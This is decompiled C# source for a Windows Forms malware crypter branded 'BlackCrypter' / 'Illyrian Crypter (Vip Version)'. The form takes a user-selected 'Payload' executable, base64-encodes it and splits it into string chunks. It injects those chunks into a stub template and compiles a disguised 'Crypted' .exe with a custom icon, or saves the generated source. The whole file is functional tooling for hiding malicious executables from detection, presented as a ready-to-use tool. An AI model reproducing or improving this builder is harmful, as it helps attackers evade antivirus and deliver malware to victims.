using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using BlackCrypter.Properties;

namespace BlackCrypter;

public class Form1 : Form
{
	private string IconPath = "";

	private IContainer components;

	private TextBox textBox1;

	private Label label1;

	private Button button1;

	private Button button2;

	private Button button3;

	private PictureBox pictureBox1;

	private Button button4;

	private PictureBox pictureBox2;

	public Form1()
	{
		InitializeComponent();
	}

	private string BuildSource()
	{
		string stub = Resources.Stub;
		string text = Convert.ToBase64String(File.ReadAllBytes(((Control)textBox1).get_Text()));
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		for (int i = 0; i <= text.Length / 1000; i++)
		{
			int length = ((text.Length > 1000 * (i + 1)) ? 1000 : (text.Length - 1000 * i));
			stringBuilder.Append("\nstring a" + i + " = \"" + text.Substring(1000 * i, length) + "\";");
			stringBuilder2.Append("a" + i + " +");
		}
		stub = stub.Replace("RPS", stringBuilder.ToString());
		return stub.Replace("STRF", stringBuilder2.ToString().Remove(stringBuilder2.ToString().Length - 2, 2));
	}

	private void button3_Click(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Invalid comparison between Unknown and I4
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text().Trim() != "" && File.Exists(((Control)textBox1).get_Text()))
		{
			SaveFileDialog val = new SaveFileDialog();
			try
			{
				((FileDialog)val).set_InitialDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
				((FileDialog)val).set_Title("Save");
				((FileDialog)val).set_FileName("Crypted");
				((FileDialog)val).set_Filter("Exe File(*.exe)|.exe");
				if ((int)((CommonDialog)val).ShowDialog() == 1)
				{
					new Compiler(BuildSource(), ((FileDialog)val).get_FileName(), IconPath);
				}
				return;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		MessageBox.Show("Please Select Your Payload First!");
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).set_Filter("ExE Files (*.exe) | *.exe");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				((Control)textBox1).set_Text(((FileDialog)val).get_FileName());
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).set_Filter("Icon Files (*.ico) | *.ico");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				try
				{
					IconPath = ((FileDialog)val).get_FileName();
					((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)3);
					((Control)pictureBox1).set_BackgroundImage(Image.FromFile(IconPath));
					return;
				}
				catch
				{
					return;
				}
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void button4_Click(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Invalid comparison between Unknown and I4
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text().Trim() != "" && File.Exists(((Control)textBox1).get_Text()))
		{
			SaveFileDialog val = new SaveFileDialog();
			try
			{
				((FileDialog)val).set_InitialDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
				((FileDialog)val).set_Title("Save");
				((FileDialog)val).set_FileName("Code");
				((FileDialog)val).set_Filter("Text File(*.txt)|.txt");
				if ((int)((CommonDialog)val).ShowDialog() == 1)
				{
					File.WriteAllText(((FileDialog)val).get_FileName(), BuildSource());
					MessageBox.Show("Done!");
				}
				return;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		MessageBox.Show("Please Select Your Payload First!");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Expected O, but got Unknown
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0256: Unknown result type (might be due to invalid IL or missing references)
		//IL_0260: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_0318: Unknown result type (might be due to invalid IL or missing references)
		//IL_0322: Expected O, but got Unknown
		//IL_0357: Unknown result type (might be due to invalid IL or missing references)
		//IL_0402: Unknown result type (might be due to invalid IL or missing references)
		//IL_046d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0477: Expected O, but got Unknown
		//IL_04af: Unknown result type (might be due to invalid IL or missing references)
		//IL_0669: Unknown result type (might be due to invalid IL or missing references)
		//IL_0673: Expected O, but got Unknown
		//IL_0675: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		textBox1 = new TextBox();
		label1 = new Label();
		button1 = new Button();
		button2 = new Button();
		button3 = new Button();
		pictureBox1 = new PictureBox();
		button4 = new Button();
		pictureBox2 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Location(new Point(16, 80));
		((Control)textBox1).set_Margin(new Padding(2));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(289, 20));
		((Control)textBox1).set_TabIndex(0);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)label1).set_Location(new Point(11, 54));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(66, 17));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Payload");
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)button1).set_Location(new Point(317, 80));
		((Control)button1).set_Margin(new Padding(2));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(56, 20));
		((Control)button1).set_TabIndex(2);
		((Control)button1).set_Text("Browse");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)button2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)button2).set_Location(new Point(16, 256));
		((Control)button2).set_Margin(new Padding(2));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(165, 29));
		((Control)button2).set_TabIndex(5);
		((Control)button2).set_Text("Browse For Icon");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button3).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)button3).set_Location(new Point(185, 116));
		((Control)button3).set_Margin(new Padding(2));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(188, 50));
		((Control)button3).set_TabIndex(6);
		((Control)button3).set_Text("Build");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)pictureBox1).set_BackColor(SystemColors.AppWorkspace);
		pictureBox1.set_Image((Image)(object)Resources.themeyllirians__1_);
		((Control)pictureBox1).set_Location(new Point(16, 116));
		((Control)pictureBox1).set_Margin(new Padding(2));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(165, 136));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)3);
		pictureBox1.set_TabIndex(7);
		pictureBox1.set_TabStop(false);
		((Control)button4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button4).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)button4).set_Location(new Point(185, 170));
		((Control)button4).set_Margin(new Padding(2));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(188, 115));
		((Control)button4).set_TabIndex(8);
		((Control)button4).set_Text("Save Source");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		pictureBox2.set_Image((Image)(object)Resources._1270051622580);
		((Control)pictureBox2).set_Location(new Point(34, -78));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(298, 244));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(9);
		pictureBox2.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Form)this).set_ClientSize(new Size(388, 296));
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(2));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Illyrian Crypter (Vip Version)");
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
